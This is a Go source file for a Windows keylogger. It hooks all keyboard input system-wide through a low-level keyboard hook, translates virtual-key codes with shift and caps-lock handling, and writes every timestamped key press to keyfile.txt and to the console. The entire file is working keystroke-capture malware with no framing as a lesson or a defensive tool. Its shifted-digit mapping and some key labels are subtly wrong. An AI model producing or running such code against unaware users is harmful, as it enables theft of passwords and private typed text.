package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
	"log"

	"golang.org/x/sys/windows"
)

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetKeyState         = user32.NewProc("GetKeyState")

	hook HHOOK
)

var asciiMap = map[int]string{
	32:  " ",
	8:   " BSPACE ",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	13:  "\nEnter",
	27:  " ESC ",
	160: " LSHIFT ",
	161: " RSHIFT ",
	20:  " CAPSLCK ",
	162: " LCTRL",
	163: " RCTRL ",
	165: " PAUSE ",
	166: " SCROLL ",
	167: " HOME ",
	91:  " WIN ",
	9:   " TAB ",
}

type HHOOK uintptr
type WPARAM uintptr
type LPARAM uintptr
type LRESULT uintptr
type KBDLLHOOKSTRUCT struct {
	VkCode    uint32
	ScanCode  uint32
	Flags     uint32
	Time      uint32
	ExtraInfo uintptr
}

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	HC_ACTION      = 0
)

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd     syscall.Handle
	Message  uint32
	WParam   WPARAM
	LParam   LPARAM
	Time     uint32
	Pt       POINT
	LPrivate uint32
}

var file *os.File
var shiftPressed bool
var capsLockOn bool

func main() {
	file, _ = os.Create("keyfile.txt")
	hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)

	var msg MSG
	for {
		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if r == 0 {
			break
		}
	}
}

func SetWindowsHookEx(idHook int, lpfn uintptr, hmod uintptr, dwThreadId uint32) HHOOK {
	ret, _, _ := procSetWindowsHookExW.Call(uintptr(idHook), lpfn, hmod, uintptr(dwThreadId))
	return HHOOK(ret)
}


func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := procCallNextHookEx.Call(uintptr(hhk), uintptr(nCode), uintptr(wParam), uintptr(lParam))
	return LRESULT(ret)
}


func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	if nCode == HC_ACTION {
		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		if wParam == WM_KEYDOWN {
			vkCode := kbdStruct.VkCode

			// Check for shift and caps lock states
			shiftPressed := (getKeyState(160) & 0x8000) != 0 || (getKeyState(161) & 0x8000) != 0
			capsLockOn := (getKeyState(20) & 0x0001) != 0

			value, exists := asciiMap[int(vkCode)]
			var output string
			if exists {
				if shiftPressed && !capsLockOn {
					value = transform(value, shiftPressed)
				} else if capsLockOn && !shiftPressed {
					value = transform(value, capsLockOn)
				}
				output = fmt.Sprintf("Keydown: %s (0x%04X)", value, vkCode)
			} else {
				output = fmt.Sprintf("Keydown: Unknown (0x%04X)", vkCode)
			}

			// Print to stdout
			fmt.Println(output)

			// Write to file
			if file != nil {
				if _, err := file.WriteString(fmt.Sprintf("%v : %v : %v\n", time.Now(), vkCode, output)); err != nil {
					log.Printf("Error writing to file: %v", err)
				}
			} else {
				log.Println("File handle is nil. Cannot write to file.")
			}
		}
	}

	return CallNextHookEx(hook, nCode, wParam, lParam)
}


func getKeyState(vkCode int) int {
	ret, _, _ := procGetKeyState.Call(uintptr(vkCode))
	return int(ret)
}


func transform(s string, shift bool) string {
	if len(s) != 1 {
		return s
	}
	
	c := s[0]
	

	if c >= 'a' && c <= 'z' {
		if shift {
			return string(c - ('a' - 'A'))
		}
		return s
	}
	

	if c >= 'A' && c <= 'Z' {
		if shift {
			return s
		}
		return string(c + ('a' - 'A'))
	}
	

	if c >= '0' && c <= '9' {
		if shift {
			return string(" !@#$%^&*()_"[c-'0'])
		}
		return s
	}
	
	
	symbols := "`1234567890-=[]\\;',./"
	symbolsShift := "~!@#$%^&*()_+{}|:\"<>?"
	
	for i := 0; i < len(symbols); i++ {
		if c == symbols[i] {
			if shift {
				return string(symbolsShift[i])
			}
			return string(c)
		}
	}
	
	return s
}


func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
	return ret != 0
}
